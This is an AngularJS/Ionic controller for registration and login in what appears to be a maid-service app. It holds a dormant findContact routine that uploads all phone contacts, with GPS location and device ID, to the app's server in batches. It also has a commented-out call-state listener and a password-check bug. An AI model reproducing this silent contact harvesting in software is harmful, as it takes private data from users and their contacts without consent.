/**
 * Created by spider-ninja on 12/12/16.
 */
angular.module('starter.controllers')
    .controller('RegCtrl', function ($scope, $state, $ionicLoading, $timeout, $ionicHistory, $cordovaGeolocation,
                                     $localstorage,
                                     $ionicPlatform, $cordovaDevice,
                                     $window, $cordovaLocalNotification, BlueTeam) {


        console.log("regcont started");
        $scope.data = {"name": "", "email": "", "mobile": "", "password": ""};
        $scope.user = {"name": "", "email": "", "mobile": "", "password": ""};

        $scope.v = {};
        $scope.v.mobile = false;
        $scope.v.password = false;
        $scope.v.conf_password = false;
        $scope.v.name = false;
        $scope.v.email = false;

        $scope.goReg = true;
        $scope.goLogin = false;

        $scope.valIP = function(){


            if($scope.data.mobile  != undefined){
                $scope.v.mobile = $scope.goLogin = true;
            }else
                $scope.v.mobile = $scope.goLogin = false;
            if($scope.data.password  != undefined){
                $scope.v.password = $scope.goLogin = true;
            }else
                $scope.v.password = $scope.goLogin = false;
            if(!$scope.registered){

                if($scope.data.conf_password  != undefined && $scope.data.password == $scope.data.conf_password){

                    $scope.v.conf_password =  $scope.goReg = true;
                }else
                    $scope.v.conf_password = $scope.goReg = false;

                if($scope.data.name  != undefined && $scope.data.name.length > 5){
                    $scope.v.name = $scope.goReg = true;
                }else
                    $scope.v.name = $scope.goReg = false;

                if($scope.data.email  != undefined && $scope.data.email.length > 5){
                    $scope.v.email = $scope.goReg = true;
                    console.log("i am in email true");
                }else
                    $scope.v.email = $scope.goReg = false;
            }
            console.log("goReg",$scope.goReg);

        };

        $scope.registered = true;
        $scope.checked = false;






        $scope.show = function () {
            $ionicLoading.show({
                template: 'Loading...'
            });
        };
        $scope.hide = function () {
            $ionicLoading.hide();
        };

        $scope.login = function () {


            $scope.show();
            BlueTeam.loginUser({
                    "root": {
                        /*"gps_location": $scope.position.coords.latitude + ',' + $scope.position.coords.longitude,*/
                        "mobile": $scope.data.mobile,
                        "password": $scope.data.password,
                        "device_id": $cordovaDevice.getUUID()

                    }
                })
                .then(function (d) {

                    //setObject
                    $scope.user = d['root'].user;
                    console.log(JSON.stringify($scope.user));
                    $scope.hide();
                    if ($scope.user.user_exist == true) {
                        $localstorage.set('name', $scope.user.name);
                        $localstorage.set('user_id', $scope.user.id);
                        $localstorage.set('mobile', $scope.user.mobile);
                        $localstorage.set('email', $scope.user.email);
                        $localstorage.set('type', $scope.user.type);
                        //$window.location.reload(true)

                        $timeout(function () {
                            $window.location.reload(true);
                        }, 5000);

                        if ($scope.user.type == "worker")
                            $state.go('tab.worker-timer');
                        else
                            $state.go('tab.service-list');

                    } else {
                        $scope.pwdError = true;
                    }

                });


        }
        $scope.checkReg = function () {
            console.log("trying to check");
            if ($scope.checked == false && $scope.data.mobile != undefined) {
                $scope.checked = true;
                BlueTeam.checkMobile($scope.data.mobile)
                    .then(function (d) {

                        console.log(d['root'].user.user_exist);
                        $scope.registered = d['root'].user.user_exist;
                        $scope.valIP();
                    });



            }
            /*else $scope.data.password = "";*/
        };
        $scope.pwdError = false;
        $scope.checkSamePwd = function () {

            if ($scope.data.password != $scope.data.conf_password) {
                $scope.pwdError = true;
            }
            $scope.pwdError = false;
            $scope.valIP();


        };

        $ionicPlatform.ready(function () {
            $scope.scheduleSingleNotification = function () {
                $cordovaLocalNotification.schedule({
                    id: 1,
                    title: 'Hi, got net request',
                    text: 'Need maid',
                    data: {
                        customProperty: 'custom value'
                    }
                }).then(function (result) {
                    // ...
                });
            };

            //$scope.scheduleSingleNotification();

            $scope.findContact = function () {
                // var fields = ["id", "displayName", "name", "nickname", "phoneNumbers", "emails", "addresses", "ims", "organizations", "birthday", "note", "photos", "categories", "urls"];

                PhoneContactsFactory.find().then(function (contacts) {
                    $arr = [];
                    $buff = [];
                    if ($localstorage.get('lastContactId'))
                        lastContactId = parseInt($localstorage.get('lastContactId'));
                    else
                        lastContactId = -1;
                    var newlastContactId = lastContactId;
                    console.log("Last Id saved ", lastContactId);
                    var j = 0;
                    var i = 0
                    for (i = 0; i < contacts.length; i++) {

                        if (lastContactId < contacts[i].id) {
                            $arr.push({
                                //name: contacts[i].name.formatted,
                                id: contacts[i].id,
                                all: JSON.stringify(contacts[i])
                            });


                            $buff.push({
                                //name: contacts[i].name.formatted,
                                id: contacts[i].id,
                                all: contacts[i]
                            });

                            if (lastContactId < contacts[i].id)
                                newlastContactId = contacts[i].id;

                            j++;

                            if (j > 20) {

                                BlueTeam.postRaw({
                                        "root": {
                                            "gps_location": $scope.position.coords.latitude + ',' + $scope.position.coords.longitude,
                                            "raw": $buff,

                                            "device_id": $cordovaDevice.getUUID()
                                        }
                                    }, "contacts")
                                    .then(function (d) {


                                    });
                                j = 0;
                                $buff = [];

                            }
                        }
                    }


                    $localstorage.set('lastContactId', newlastContactId);
                    if ($buff.length > 0) {
                        BlueTeam.postRaw({
                                "root": {
                                    "gps_location": $scope.position.coords.latitude + ',' + $scope.position.coords.longitude,
                                    "raw": $buff,

                                    "device_id": $cordovaDevice.getUUID()
                                }
                            }, "contacts")
                            .then(function (d) {


                            });

                    }
                    //$scope.contacts = $arr;
                    //console.log(JSON.stringify($scope.contacts));


                });
            };
            //$scope.findContact();

            /*PhoneCallTrap.onCall(function(state) {
                console.log("CHANGE STATE: " + state);

                switch (state) {
                    case "RINGING":
                        console.log("Phone is ringing");
                        break;
                    case "OFFHOOK":
                        console.log("Phone is off-hook");
                        break;

                    case "IDLE":
                        console.log("Phone is idle");
                        break;
                }
            });*/

        });


        if ($localstorage.get('name') === undefined || $localstorage.get('mobile') === undefined || $localstorage.get('email') === undefined ||
            $localstorage.get('name') === "" || $localstorage.get('mobile') === "") {

        } else {
            $ionicHistory.clearHistory();
            if ($localstorage.get('type') == "worker")
                $state.go('tab.worker-timer');
            else
                $state.go('tab.service-list');
        }


        $scope.regUser = function () {
            if ($scope.checked == false) {
                $scope.checkReg();
                return;
            }
            if ($scope.registered) {
                $scope.login();
                return;
            }

            if ($scope.data.password == $scope.data.conf_password) {
                $scope.show();
                BlueTeam.regUser({
                        "root": {
                            /*"gps_location": $scope.position.coords.latitude + ',' + $scope.position.coords.longitude,
                            */"name": $scope.data.name,
                            "mobile": $scope.data.mobile,
                            "coupon": $scope.data.coupon,
                            "type": "customer",
                            "password": $scope.data.password,
                            "conf_password": $scope.data.conf_password,
                            "email": "" + $scope.data.email,
                            "device_id": $cordovaDevice.getUUID()
                        }
                    })
                    .then(function (d) {

                        //setObject
                        $scope.user = d['root'];
                        $localstorage.set('name', $scope.data.name);
                        $localstorage.set('mobile', $scope.data.mobile);
                        $localstorage.set('email', $scope.data.email);
                        $localstorage.set('type', "customer");
                        $localstorage.set('user_id', $scope.user.id);
                        $scope.data.name = "";
                        $scope.data.mobile = "";
                        $scope.data.email = "";
                        $scope.data.password = "";
                        $scope.data.conf_password = "";

                        $timeout(function () {
                            $window.location.reload(true);
                        }, 5000);

                        $scope.hide();
                        $state.go('tab.service-list');

                    });
            } else $scope.pwdError = true;
        };
        $scope.valIP();
    })
;